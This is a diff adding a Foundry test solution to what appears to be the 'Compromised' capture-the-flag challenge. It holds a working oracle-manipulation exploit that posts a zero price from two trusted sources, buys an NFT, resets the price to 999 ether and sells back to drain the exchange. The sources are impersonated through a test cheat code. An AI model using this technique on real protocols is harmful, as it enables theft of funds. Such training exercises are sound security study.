@@ -9,6 +9,7 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {CompromisedExploiter} from "./CompromisedExploiter.sol";
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -75,7 +76,34 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+
+        // Set the price of the NFT to 0
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0],0);
+        vm.stopPrank();
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[0],0);
+        vm.stopPrank();
+
+        vm.prank(player);
+
+        uint256 nftId = exchange.buyOne{value: address(player).balance}();
+
+        // Reset the price to the original value
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0],999 ether);
+        vm.stopPrank();
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[0],999 ether);
+        vm.stopPrank();
         
+        vm.startPrank(player);
+
+        nft.approve(address(exchange), nftId); 
+        exchange.sellOne(nftId);
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
+        
+        vm.stopPrank();
     }
 
     /**
